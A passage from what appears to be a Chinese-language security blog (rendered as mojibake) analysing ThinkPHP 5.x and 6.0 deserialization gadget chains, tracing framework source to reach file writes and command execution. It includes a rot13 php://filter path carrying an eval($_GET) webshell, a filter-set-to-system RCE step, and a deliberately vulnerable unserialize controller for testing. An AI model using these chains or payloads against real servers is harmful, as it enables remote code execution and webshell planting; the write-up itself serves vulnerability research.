get_class($this-&gt;parent)</code>æˆç«‹äº†ã€‚<br>æ„æ€å°±æ˜¯<code>$modelRelation-&gt;getModel()</code>å’Œ<code>$this-&gt;parent</code>ä¸ºåŒç±»ï¼Œä¹Ÿå°±æ˜¯è¦æ±‚<code>$value-&gt;getAttr($attr)</code>ä¸­çš„<code>$value</code>å’Œä¸Šé¢å¯æ§çš„modelä¸ºåŒç±»<br>é‚£ä¹ˆç°åœ¨<code>$value-&gt;getAttr($attr)</code>çš„<code>value</code>è·Ÿå®Œäº†ã€‚æˆ‘ä»¬æ¥çœ‹çœ‹<code>$attr</code></p><pre><code class="php">$bindAttr = $modelRelation-&gt;getBindAttr();if ($bindAttr) {    foreach ($bindAttr as $key =&gt; $attr)    ......</code></pre><p>ä¸Šé¢æåˆ°è¿‡ï¼Œ<code>modelRelation</code>å› ä¸ºå–è‡ªå¯æ§æ–¹æ³•æ‰€ä»¥æ˜¯ä»»æ„å€¼ã€‚æˆ‘ä»¬ç›´æ¥å…¨å±€æ‰¾<code>getBindAttr</code>æ–¹æ³•ã€‚åªæœ‰ä¸€ä¸ªæ¥å£ç±»:Relationçš„å­ç±»OnetoOne</p><pre><code class="php">public function getBindAttr(){    return $this-&gt;bindAttr;}</code></pre><p>æ•°æ®å¯æ§ã€‚ä¸è¿‡OnetoOneæ˜¯æŠ½è±¡ç±»ã€‚æ‰€ä»¥ç»§ç»­æ‰¾å­ç±»ã€‚è¿™é‡Œå°±åªæœ‰ä¸¤ä¸ªå­ç±»ã€‚æˆ‘ä»¬é€‰æ‹©<code>HasOne</code>.</p><p>ç°åœ¨ã€‚æˆ‘ä»¬åšåˆ°äº†ä»»æ„è°ƒç”¨<code>__call</code>ã€‚å‰©ä¸‹çš„å°±æ˜¯æ‰¾å¯ç”¨çš„<code>__call</code>ã€‚</p><p>é‚£ä¹ˆå…¨å±€æ‰¾å¯ç”¨çš„<code>__call</code>ã€‚æ­¤å¤„å¯ä»¥æ‰¾åˆ°<br>think\console\Output ç±»ã€‚</p><pre><code class="php">public function __call($method, $args){    if (in_array($method, $this-&gt;styles)) {        array_unshift($args, $method);        return call_user_func_array([$this, &#39;block&#39;], $args);    }    if ($this-&gt;handle &amp;&amp; method_exists($this-&gt;handle, $method)) {        return call_user_func_array([$this-&gt;handle, $method], $args);    } else {        throw new Exception(&#39;method not exists:&#39; . __CLASS__ . &#39;-&gt;&#39; . $method);    }}</code></pre><p>é‚£ä¹ˆé¦–å…ˆä¸Šé¢è§¦å‘ç‚¹é‡Œ<code>$this-&gt;parent</code>è‚¯å®šæ˜¯è¦ä¼ Outputç±»çš„å®ä¾‹äº†ã€‚<br>ä¸‹é¢çœ‹è¿™é‡Œçš„<code>$this-&gt;block()</code></p><pre><code class="php">protected function block($style, $message){    $this-&gt;writeln(&quot;&lt;{$style}&gt;{$message}&lt;/$style&gt;&quot;);}public function writeln($messages, $type = self::OUTPUT_NORMAL){    $this-&gt;write($messages, true, $type);}public function write($messages, $newline = false, $type = self::OUTPUT_NORMAL){    $this-&gt;handle-&gt;write($messages, $newline, $type);}</code></pre><p>è°ƒç”¨çš„æ˜¯<code>$this-&gt;handle-&gt;write</code>ã€‚æ—¢ç„¶<code>$this-&gt;handle</code>å¯æ§,é‚£ä¹ˆæ­¤å¤„æ‰¾ä¸€ä¸ªåŒåçš„<code>write</code>æ–¹æ³•ã€‚æˆ‘ä»¬å…¨å±€æœç´¢æ‰¾åˆ°Memcachedç±»</p><pre><code class="php">public function write($sessID, $sessData){    return $this-&gt;handler-&gt;set($this-&gt;config[&#39;session_name&#39;] . $sessID, $sessData, $this-&gt;config[&#39;expire&#39;]);}</code></pre><p>åŒç†ã€‚è¿˜æ˜¯å¯ä»¥å…¨å±€æ‰¾<code>set</code>æ–¹æ³•ã€‚ç¬¬ä¸€ä¸ªå°±æ˜¯æˆ‘ä»¬æ›¾ç»åœ¨tp5RCEä¸­è§åˆ°çš„Fileç±»</p><pre><code class="php">public function set($name, $value, $expire = null){    if (is_null($expire)) {        $expire = $this-&gt;options[&#39;expire&#39;];    }    if ($expire instanceof \DateTime) {        $expire = $expire-&gt;getTimestamp() - time();    }    $filename = $this-&gt;getCacheKey($name, true);    if ($this-&gt;tag &amp;&amp; !is_file($filename)) {        $first = true;    }    $data = serialize($value);    if ($this-&gt;options[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) {        //æ•°æ®å‹ç¼©        $data = gzcompress($data, 3);    }    $data   = &quot;&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;    $result = file_put_contents($filename, $data);    if ($result) {        isset($first) &amp;&amp; $this-&gt;setTagItem($filename);        clearstatcache();        return true;    } else {        return false;    }}</code></pre><p>ä¹‹å‰æ›¾ç»è¯´è¿‡rceæ—¶ç¼“å­˜æ–‡ä»¶åä¸å¯æ§ã€‚ä½†æ˜¯åœ¨ååºåˆ—åŒ–ä¸­å°±ä¸å­˜åœ¨è¿™ä¸ªé—®é¢˜ã€‚</p><pre><code class="php">$filename = $this-&gt;getCacheKey($name, true);protected function getCacheKey($name, $auto = false){    $name = md5($name);    if ($this-&gt;options[&#39;cache_subdir&#39;]) {        // ä½¿ç”¨å­ç›®å½•        $name = substr($name, 0, 2) . DS . substr($name, 2);    }    if ($this-&gt;options[&#39;prefix&#39;]) {        $name = $this-&gt;options[&#39;prefix&#39;] . DS . $name;    }    $filename = $this-&gt;options[&#39;path&#39;] . $name . &#39;.php&#39;;    $dir      = dirname($filename);    if ($auto &amp;&amp; !is_dir($dir)) {        mkdir($dir, 0755, true);    }    return $filename;}</code></pre><p>æ–‡ä»¶åæ¥è‡ª<code>$filename = $this-&gt;options[&#39;path&#39;] . $name . &#39;.php&#39;;</code>.å¯æ§ã€‚<br>æˆ‘ä»¬å†çœ‹æ–‡ä»¶å†…å®¹å¦‚ä½•æ§åˆ¶ã€‚</p><pre><code class="php">$data   = &quot;&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;</code></pre><p>è¿™é‡Œå°±æ˜¯popé“¾æœ€å¤§çš„éš¾ç‚¹äº†ã€‚<code>$data</code>å…¶å®å¹¶ä¸å¯æ§ã€‚å…·ä½“å¯ä»¥å›æº¯åˆ°æˆ‘åˆšåˆšä¸Šé¢æ”¾çš„ä¸€è¿ä¸²è°ƒç”¨writeæ–¹æ³•çš„æºç å¤„ã€‚æ³¨æ„åˆ°</p><pre><code class="php">public function writeln($messages, $type = self::OUTPUT_NORMAL){    $this-&gt;write($messages, true, $type);}</code></pre><p>writeç¬¬äºŒä¸ªå‚æ•°æ˜¯å†™æ­»çš„<code>true</code>ã€‚å®ƒä¼šä¸€è·¯ä¼ åˆ°Fileç±»ä½œä¸º<code>$data</code>å†™å…¥ã€‚é‚£ä¹ˆæˆ‘ä»¬å†™æ–‡ä»¶ç­‰äºæ§åˆ¶ä¸äº†å†™å…¥å†…å®¹ã€‚</p><p>ä½†æ˜¯æ²¡æœ‰å…³ç³»ã€‚setåœ¨è¿™ä¸ªfile_put_contentsä¸‹è¿˜è°ƒç”¨äº†ä¸€ä¸ªå‡½æ•°setTagItem</p><pre><code class="php">protected function setTagItem($name){    if ($this-&gt;tag) {        $key       = &#39;tag_&#39; . md5($this-&gt;tag);        $this-&gt;tag = null;        if ($this-&gt;has($key)) {            $value   = explode(&#39;,&#39;, $this-&gt;get($key));            $value[] = $name;            $value   = implode(&#39;,&#39;, array_unique($value));        } else {            $value = $name;        }        $this-&gt;set($key, $value, 0);    }}</code></pre><p>åœ¨è¿™é‡Œæˆ‘ä»¬åˆä¸€æ¬¡è°ƒç”¨äº†<code>set</code>ã€‚å¹¶ä¸”ä¸¤ä¸ªå‚æ•°å…¨éƒ¨å¯æ§ã€‚æ‰€ä»¥æœ€åå¾ªç¯è°ƒç”¨æˆ‘ä»¬å°±çŸ¥é“,å†™å…¥æ–‡ä»¶çš„æ–‡ä»¶åä¸º<code>md5(&#39;tag_&#39; . md5($this-&gt;tag)).&#39;.php&#39;</code>ã€‚å†…å®¹ä¸º<code>$data   = &quot;&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;</code></p><p>å½“ç„¶ã€‚è¿™é‡Œæ˜¾ç„¶å­˜åœ¨ä¸€ä¸ªç»•è¿‡æ­»äº¡exitçš„é—®é¢˜ã€‚ä½¿ç”¨rot13å³å¯ã€‚ç„¶årot13çš„payloadç»•ä¸è¿‡é»˜è®¤çš„çŸ­æ ‡ç­¾ã€‚æ‰€ä»¥ä¼šéœ€è¦åŠ è¿‡æ»¤å™¨ç»„åˆæ‹³ã€‚é™¤äº†å¸¸è§çš„base64ï¼ŒWMCTFä¸­ä½¿ç”¨åˆ°å…¶ä»–çš„<code>iconv</code>æˆ–è€…å…¶ä»–ç»„åˆä¹Ÿæ˜¯å¯è¡Œçš„ã€‚<br>åŸç†ä¸å†èµ˜è¿°<br>é‚£ä¹ˆã€‚æ§åˆ¶payloadåªè¦æ§åˆ¶Fileç±»<code>$this-&gt;options[&#39;path&#39;] = php://filter/write=string.rot13/resource=&lt;?cuc @riny($_TRG[_]);?&gt;</code>å³å¯ã€‚</p><p>æ‰§è¡Œexpæ‰“çš„è¯ã€‚ä¼šå‘ç°å­˜åœ¨ä¸¤ä¸ªæ–‡ä»¶ã€‚è¿™æ˜¯ä¸Šé¢æˆ‘ä»¬è°ƒç”¨äº†ä¸¤æ¬¡<code>set</code>çš„ç¼˜æ•…ã€‚è€Œæ–‡ä»¶åç”±æˆ‘ä»¬çš„<code>$tag</code>å†³å®šã€‚å…·ä½“è®¡ç®—æ–¹æ³•ä¹Ÿåœ¨ä¸Šé¢æåŠäº†ã€‚å½“ç„¶æœ€å¥½çš„æ–¹æ³•æ°¸è¿œæ˜¯æœ¬åœ°è‡ªå·±æ‰“ä¸€éã€‚è¿™æ ·æ‰èƒ½ç¡®ä¿¡æ–‡ä»¶åè¿™ç§è¿œç¨‹ä¸å¯è§çš„ä¸œè¥¿ã€‚</p><p>å¦å¤–æˆ‘ç›¸ä¿¡å¤§å®¶è‚¯å®šå‘ç°è¿™ä¸ªpopé“¾æœ‰ä¸ªå˜æ‹›ã€‚é‚£å°±æ˜¯linux,windowsé€šç”¨çš„å†™ç›®å½•ã€‚å›åˆ°ä¸Šé¢getCacheKey</p><pre><code class="php">$dir = dirname($filename);if ($auto &amp;&amp; !is_dir($dir)) {mkdir($dir, 0755, true);}</code></pre><p>åªè¦æŠŠ<code>$this-&gt;options[&#39;path&#39;]</code>è®¾ç½®ä¸ºç›®å½•çš„è¯ã€‚ç›´æ¥å¯ä»¥å†™755æƒé™ç›®å½•ã€‚</p><p>SCTF2020 è€ƒå¯Ÿtp5.024é‚£é“é¢˜å½“æ—¶ä½¿ç”¨äº†pythonè„šæœ¬é«˜å¼ºåº¦åˆ æ–‡ä»¶ã€‚å¯¼è‡´æˆ‘ä»¥ä¸ºå½“å‰ç›®å½•ä¸å¯å†™ã€‚ä½†æ˜¯æ¢æˆå†™ç›®å½•çš„payloadåå‘ç°å¯ä»¥åˆ›å»ºç›®å½•ã€‚å¹¶ä¸”å¯ä»¥å­˜åœ¨ç›¸åŒäºé¶æœºé‡å¯æ—¶é—´çš„3åˆ†é’Ÿã€‚æ‰€ä»¥ä½¿ç”¨è¿™ç§payloadé»‘ç›’æ¢æµ‹ä¸å¤±ä¸ºä¸€ç§åŠæ³•ã€‚</p><h2 id="tp5-1-x-unserialize"><a href="#tp5-1-x-unserialize" class="headerlink" title="tp5.1.x-unserialize"></a>tp5.1.x-unserialize</h2><p>ä»Šå¤©æ¥è·Ÿä¸‹5.1çš„popé“¾ã€‚ç›¸æ¯”5.0è€Œè¨€æ€è·¯å¤§è‡´ç›¸åŒã€‚åªæœ‰å‡ ä¸ªç±»çš„åŒºåˆ«ã€‚å¹¶ä¸”å…¶expå·²ç»é›†æˆåˆ°phpggcä¸Šäº†ã€‚</p><p>è¿˜æ˜¯ä»èµ·ç‚¹å¼€å§‹çœ‹ã€‚è·Ÿæ˜¨å¤©5.0çš„é“¾å­æ˜¯ä¸€æ ·çš„ã€‚ä»Windowsç±»å¼€å§‹ã€‚ç„¶å=&gt;file_exists =&gt; <strong>toString()ã€‚ç„¶åæ¥ç€å…¨å±€æœç´¢ã€‚æ­¤å¤„åˆ©ç”¨Conversionçš„</strong>toString() =&gt; __toJson() =&gt; toArray()<br>è€Œä¸æ˜¯5.0ä¸­çš„Modelç±»</p><p>çœ‹åˆ°thinkphp\library\think\model\concern\Conversion.php<br>ä¸­çš„<code>toArray()</code> .æˆ‘ä»¬åŒæ ·å¯»æ‰¾å¯ä»¥è§¦å‘<code>__call()</code>çš„ä»£ç </p><p><img src="/2020/08/05/Thinkphp-vuln/22.PNG" class="lazyload" data-srcset="22.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ­¤å¤„ä¸»è¦æ˜¯<code>$relation-&gt;visible($name)</code>ä¼šè§¦å‘<code>__call</code>.é€‰æ‹©è¿™ä¸€å¤„çš„ä»£ç æ˜¯å› ä¸º,relationæ¥è‡ª<code>$this-&gt;getRelation($key)</code>.<code>$name</code>æ¥è‡ª<code>$this-&gt;append</code>.<br>çœ‹åˆ°getRelation</p><pre><code class="php">public function getRelation($name = null){    if (is_null($name)) {        return $this-&gt;relation;    } elseif (array_key_exists($name, $this-&gt;relation)) {        return $this-&gt;relation[$name];    }    return;}</code></pre><p>æˆ‘ä»¬è¦è¿›å…¥<code>visble</code>çš„åˆ†æ”¯ã€‚å¿…é¡»è¦<code>$relation</code>ä¸ºç©ºã€‚æ‰€ä»¥<code>$this-&gt;relation</code>ç›´æ¥ç½®ç©ºå³å¯ã€‚</p><p>æ­¤æ—¶<code>$relation</code>ç”±<code>$relation = $this-&gt;getAttr($key);</code>å†³å®šã€‚å®ƒä¼šä¾æ¬¡è°ƒç”¨\thinkphp\library\think\model\concern\Attribute.php çš„getAttr()ä¸getData()</p><pre><code class="php"> public function getAttr($name, &amp;$item = null){    try {        $notFound = false;        $value    = $this-&gt;getData($name);    } catch (InvalidArgumentException $e) {        ......public function getData($name = null){    if (is_null($name)) {        return $this-&gt;data;    } elseif (array_key_exists($name, $this-&gt;data)) {        return $this-&gt;data[$name];    } elseif (array_key_exists($name, $this-&gt;relation)) {        return $this-&gt;relation[$name];    }    throw new InvalidArgumentException(&#39;property not exists:&#39; . static::class . &#39;-&gt;&#39; . $name);}</code></pre><p>è¿™æ ·å°±èƒ½ç¡®è®¤æˆ‘ä»¬çš„<code>$relation</code>æ¥è‡ªAttributeç±»çš„<code>$this-&gt;data[$name]</code>.</p><p>ç°åœ¨éœ€è¦æ³¨æ„çš„æ˜¯ã€‚æˆ‘ä»¬å¿…é¡»å¾—æ‰¾åˆ°ä¸€ä¸ªæ—¢èƒ½è°ƒç”¨Conversionè¿˜èƒ½è°ƒç”¨Attributeå±æ€§çš„ç±»ã€‚å³ç»§æ‰¿äº†Attributeç±»å’ŒConversionç±»çš„å­ç±»ã€‚è¿™ä¸ªå…¶å®å°±æ˜¯æˆ‘ä»¬ä¹‹å‰5.0é“¾å­ä¸­ç”¨è¿‡çš„Model.phpã€‚<br>åŠ ä¸ŠModelæ˜¯æŠ½è±¡ç±»ã€‚æ‰€ä»¥ç¼–å†™expä¸­ä½¿ç”¨å®ƒçš„å­ç±»Pivotå®ä¾‹åŒ–ã€‚è¿™ç‚¹ä¸å¿…å¤šè¯´ã€‚</p><p>æ¥ä¸‹æ¥çœ‹<code>$relation-&gt;visible($name)</code>ä¸­çš„<code>$name</code>.å®ƒæ˜¯éå†<code>$this-&gt;append</code>å¾—åˆ°çš„ã€‚å¯æ§ã€‚åªéœ€æ³¨æ„å°†å…¶èµ‹å€¼ä¸ºæ•°ç»„å³å¯ã€‚(å› ä¸ºè¦è¿›å…¥<code>if (is_array($name))</code>çš„åˆ†æ”¯)</p><p>æ—¢ç„¶å·²ç»æ‹¥æœ‰è§¦å‘<code>__call</code>çš„æ¡ä»¶äº†ã€‚æˆ‘ä»¬ç°åœ¨æ‰¾ä¸€ä¸ªå¯ç”¨çš„<code>__call</code>ã€‚5.1ç‰ˆæœ¬ä¸­çš„gadgetå°±æ˜¯æ¥è‡ªRequestç±»çš„<code>__call</code>ã€‚</p><pre><code class="php">public function __call($method, $args){    if (array_key_exists($method, $this-&gt;hook)) {        array_unshift($args, $this);        return call_user_func_array($this-&gt;hook[$method], $args);    }    throw new Exception(&#39;method not exists:&#39; . static::class . &#39;-&gt;&#39; . $method);}</code></pre><p>æ˜¾ç„¶<code>$this-&gt;hook</code>å¯ä»¥è®©æˆ‘ä»¬æ§åˆ¶ä¸º<code>[&quot;visable&quot;-&gt;&quot;arbitrary method&quot;]</code>è¿™ä¸ªæ•°ç»„ä»»æ„è°ƒç”¨æ–¹æ³•ã€‚ä½†æ˜¯æ³¨æ„<code>array_unshift($args, $this)</code>ä¼šå¼ºè¡ŒæŠŠ<code>$this</code>æ”¾åˆ°<code>$args</code>æ•°ç»„çš„ç¬¬ä¸€ä½ã€‚å…¶åæœæ˜¯æ€æ ·çš„å‘¢ï¼Ÿæˆ‘ä»¬çœ‹ä¸‹<code>call_user_func_array</code></p><pre><code class="php">call_user_func_array([$obj,&quot;arbitrary method&quot;],[$this,$arg])=&gt;$obj-&gt;$func($this,$argv)</code></pre><p>è¿™ç§æ–¹æ³•æ‰§è¡Œå‡ ä¹æ²¡æœ‰ã€‚æ‰€ä»¥è¿™å°±é™åˆ¶æˆ‘ä»¬è¦æ‰¾ä¸€ä¸ªä¸å—è¿™ç§è°ƒç”¨æ–¹å¼å½±å“çš„å‡½æ•°ã€‚</p><p>åœ¨ä»¥å‰tp5çš„æ¼æ´åˆ†æä¸­,æ›¾ç»ç”¨åˆ°è¿‡<code>think\Request</code>ç±»ä¸­çš„input æ–¹æ³•ã€‚é‡Œé¢æœ‰<code>call_user_func($filter,$data)</code>å¯ä»¥ç”¨äºå‘½ä»¤æ‰§è¡Œã€‚<br>ä½†æ˜¯å‰é¢è¯´è¿‡ï¼Œ <code>$args</code> æ•°ç»„å˜é‡çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œæ˜¯ä¸€ä¸ªå›ºå®šæ­»çš„ç±»å¯¹è±¡ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥è°ƒç”¨ input æ–¹æ³•ï¼Œè€Œåº”è¯¥å¯»æ‰¾è°ƒç”¨ input çš„æ–¹æ³•ã€‚</p><p>æ•´ä¸ªRequestç±»ä¸­ä¸€å…±æœ‰7å¤„è°ƒç”¨inputæ–¹æ³•çš„å…¶ä»–æ–¹æ³•ã€‚æˆ‘ä»¬é€‰æ‹©<code>param</code>æ–¹æ³•ä¸ºä¾‹</p><pre><code class="php">public function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;){    if (!$this-&gt;mergeParam) {        $method = $this-&gt;method(true);        // è‡ªåŠ¨è·å–è¯·æ±‚å˜é‡        switch ($method) {            case &#39;POST&#39;:                $vars = $this-&gt;post(false);                break;            case &#39;PUT&#39;:            case &#39;DELETE&#39;:            case &#39;PATCH&#39;:                $vars = $this-&gt;put(false);                break;            default:                $vars = [];        }        // å½“å‰è¯·æ±‚å‚æ•°å’ŒURLåœ°å€ä¸­çš„å‚æ•°åˆå¹¶        $this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));        $this-&gt;mergeParam = true;    }    if (true === $name) {        // è·å–åŒ…å«æ–‡ä»¶ä¸Šä¼ ä¿¡æ¯çš„æ•°ç»„        $file = $this-&gt;file();        $data = is_array($file) ? array_merge($this-&gt;param, $file) : $this-&gt;param;        return $this-&gt;input($data, &#39;&#39;, $default, $filter);    }    return $this-&gt;input($this-&gt;param, $name, $default, $filter);}</code></pre><p>è°ƒç”¨äº†<code>input</code>æ–¹æ³•ä½†æ˜¯åªæœ‰ä¸€ä¸ª<code>$param</code>æ˜¯å¯æ§çš„ã€‚æ‰€ä»¥è¿˜è¦ç»§ç»­æ‰¾è°ƒç”¨<code>param</code>çš„æ–¹æ³•ã€‚</p><pre><code class="php">public function isAjax($ajax = false){    $value  = $this-&gt;server(&#39;HTTP_X_REQUESTED_WITH&#39;);    $result = &#39;xmlhttprequest&#39; == strtolower($value) ? true : false;    if (true === $ajax) {        return $result;    }    $result   = $this-&gt;param($this-&gt;config[&#39;var_ajax&#39;]) ? true : $result;    $this-&gt;mergeParam = false;    return $result;}</code></pre><p>isAjaxæ–¹æ³•è¿”å›å€¼ç”±<code>$this-&gt;config[&#39;var_ajax&#39;]</code>æ§åˆ¶ã€‚é‚£ä¹ˆç­‰äºæ§åˆ¶äº†paramçš„å‚æ•°<code>$name</code>.ç­‰äºæ§åˆ¶äº†input çš„å‚æ•°<code>$name</code>.</p><p>æœ€åå†æ¥åˆ°inputæ–¹æ³•è¿™çœ‹è°ƒç”¨ã€‚</p><pre><code class="php">public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;){    if (false === $name) {        // è·å–åŸå§‹æ•°æ®        return $data;    }    $name = (string) $name;    if (&#39;&#39; != $name) {        // è§£æname        if (strpos($name, &#39;/&#39;)) {            list($name, $type) = explode(&#39;/&#39;, $name);        }        $data = $this-&gt;getData($data, $name);        if (is_null($data)) {            return $default;        }        if (is_object($data)) {            return $data;        }    }    // è§£æè¿‡æ»¤å™¨    $filter = $this-&gt;getFilter($filter, $default);    if (is_array($data)) {        array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);        if (version_compare(PHP_VERSION, &#39;7.1.0&#39;, &#39;&lt;&#39;)) {            // æ¢å¤PHPç‰ˆæœ¬ä½äº 7.1 æ—¶ array_walk_recursive ä¸­æ¶ˆè€—çš„å†…éƒ¨æŒ‡é’ˆ            $this-&gt;arrayReset($data);        }    } else {        $this-&gt;filterValue($data, $name, $filter);    }    if (isset($type) &amp;&amp; $data !== $default) {        // å¼ºåˆ¶ç±»å‹è½¬æ¢        $this-&gt;typeCast($data, $type);    }    return $data;}</code></pre><p>getDataé¡ºç€çœ‹ä¸€ä¸‹å¯æ§ã€‚ä¸”<code>$data</code>=<code>$data[$name]</code>,<code>$filter</code>æ¥è‡ª<code>$this-&gt;filter</code>.æœ€ååˆ°äº†array_walk_resursiveç›¸å½“äºç›´æ¥å¯¹æ•°ç»„æ¯ä¸€ä¸ªå€¼è°ƒç”¨äº†å›è°ƒå‡½æ•°<code>$this-&gt;filterValue($filter)</code>ã€‚</p><pre><code class="php">if (is_array($data)) {    array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);</code></pre><p><code>$this-&gt;filterValue</code>æ˜¯é€šè¿‡call_user_funcæ‰§è¡Œçš„è‡ªç„¶ä¸å¿…è¯´äº†ã€‚<br>æ—¢ç„¶å¦‚æ­¤ã€‚æ§åˆ¶<code>$this-&gt;filter</code>ä¸ºsystem,<code>$data</code>æ•°ç»„ç¬¬ä¸€ä¸ªå€¼ä¸ºå‘½ä»¤<code>whoami</code>ä¹‹ç±»çš„å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤äº†ã€‚</p><p>è‡³æ­¤popé“¾å°±å®Œæ•´äº†ã€‚å…¶å®ä¸­é—´æœ‰ä¸ªæ­¥éª¤å°±æ˜¯è§£å†³<code>call_user_func_array</code>é‚£æ‰¾åˆ°ä¸å—å®šæ­»å‚æ•°å½±å“çš„å‘½ä»¤æ‰§è¡Œè¿™å—,ä¸»è¦æ€è·¯å°±æ˜¯åˆ©ç”¨thinkphpè¿‡æ»¤å™¨,è¦†ç›–filterçš„æ–¹æ³•å»æ‰§è¡Œä»£ç ã€‚<br>è€Œåœ¨æ‰¾åˆ°inputä½œä¸ºä¸»è¦ä¸‹æ‰‹ç‚¹æ—¶,<code>call_user_func_array(array(ä»»æ„ç±»,ä»»æ„æ–¹æ³•),$args)</code> ä¸­ <code>$args</code> æ•°ç»„çš„ç¬¬ä¸€ä¸ªå˜é‡ï¼Œå³æˆ‘ä»¬å‰é¢è¯´çš„ä¸€ä¸ªå›ºå®šæ­»çš„ç±»å¯¹è±¡ä¼šä½œä¸º $data ä¼ ç»™ input æ–¹æ³•ï¼Œé‚£ä¹ˆåœ¨å¼ºè½¬æˆå­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œæ¡†æ¶å°±ä¼šæŠ¥é”™é€€å‡ºã€‚æ‰€ä»¥æˆ‘ä»¬æ‰¾ä¸åˆ°å°±ç»§ç»­æ‰¾ä¸Šå±‚è°ƒç”¨inputçš„å‡½æ•°ã€‚ç›´åˆ°æ‰¾åˆ°å¯æ§å‚æ•°çš„å‡½æ•°<code>isAjax</code>.å°±èƒ½è§£å†³å‚æ•°ä¸å¯æ§çš„é—®é¢˜ã€‚</p><h2 id="tp5-2-x-unserialize"><a href="#tp5-2-x-unserialize" class="headerlink" title="tp5.2.x-unserialize"></a>tp5.2.x-unserialize</h2><p>5.2ç‰ˆæœ¬çš„é“¾å­è²Œä¼¼è·Ÿä¹‹å‰æ²¡å•¥åŒºåˆ«ã€‚ä½†æ˜¯æˆ‘composerä¸€ç›´å®‰è£…ä¸ä¸Šã€‚åŠ ä¸Š5.2ç‰ˆæœ¬ä½œä¸ºdevç‰ˆæœ¬æœ¬èº«å‡ºç°çš„ä¸å¤š,æ‰€ä»¥è¿™é‡Œç”¨thinkphp-vulné‡Œçš„ä¾‹å­ç®€å•æä¸€ä¸‹ã€‚</p><p>å‰é¢å…¥æ‰‹ç‚¹å¤§åŒå°å¼‚ã€‚å”¯ä¸€æœ‰åŒºåˆ«çš„åœ°æ–¹åœ¨è§¦å‘<code>__call</code>çš„ä»£ç <code>$relation-&gt;visible($name)</code>è¿™ã€‚çœ‹ä¼¼tp5.2å·²ç»æŠŠè¿™å¥ä»£ç åˆ äº†ã€‚ä½†æ˜¯å®é™…ä¸Šæ˜¯è¢«è½¬ç§»åˆ°äº†<code>appendAttrToArray</code>è¿™ä¸ªæ–¹æ³•ä¸­ã€‚å› æ­¤åŸºæœ¬æ²¡æœ‰åŒºåˆ«ã€‚æˆ‘å°±ä¸è·Ÿäº†ã€‚</p><p>æ”¾ä¸Šå‡ å¼ å›¾<br><img src="/2020/08/05/Thinkphp-vuln/23.PNG" class="lazyload" data-srcset="23.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>çœŸæ­£çš„æ‰§è¡Œç‚¹åœ¨ä¸‹é¢çš„<code>$closure($value,$this-&gt;data)</code>è¿™é‡Œçš„åŠ¨æ€è°ƒç”¨ã€‚å‚æ•°å‡å¯æ§ã€‚æ‰€ä»¥èµ‹å€¼å‘½ä»¤æ‰§è¡Œçš„å‚æ•°å³å¯ã€‚<br><img src="/2020/08/05/Thinkphp-vuln/24.PNG" class="lazyload" data-srcset="24.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="tp6-0-x-unserialize"><a href="#tp6-0-x-unserialize" class="headerlink" title="tp6.0.x-unserialize"></a>tp6.0.x-unserialize</h2><p>ä»Šå¤©é‡æ–°çœ‹äº†ä¸‹ä¹‹å‰åœ¨ phpæ¡†æ¶ååºåˆ—åŒ–ç»ƒä¹  æ–‡ç« é‡Œçš„å†…å®¹ã€‚æ‰æƒ³èµ·æ¥5.2è·Ÿ6.0çš„é“¾å­åº”è¯¥æ˜¯è·Ÿè¿‡äº†ã€‚ä¸è¿‡å½“æ—¶æ²¡æœ‰åŠ¨æ€è°ƒè¯•,ç†è§£ä¹Ÿæ²¡é‚£ä¹ˆæ·±åˆ»ã€‚æ‰€ä»¥è¿˜æ˜¯å†çœ‹ä¸€ä¸‹ã€‚</p><p>è¿˜æ˜¯è€æ ·å­æ›´æ”¹Index.php</p><pre><code class="php">&lt;?phpnamespace app\controller;class Index{    public function index()    {        $u = unserialize($_GET[&#39;c&#39;]);        return &#39;ThinkPHP V6.x&#39;;    }}</code></pre><p>ç›´æ¥ç”¨wh1t3p1g å¸ˆå‚…é›†æˆå¥½çš„ã€‚é¡ºå¸¦ä¹Ÿæ¨èä¸‹å¸ˆå‚…åœ¨å®‰å…¨å®¢ä¸Šé’ˆå¯¹thinkphpé“¾å­çš„åˆ†ææ–‡ç« ã€‚<br><img src="/2020/08/05/Thinkphp-vuln/25.PNG" class="lazyload" data-srcset="25.PNG" 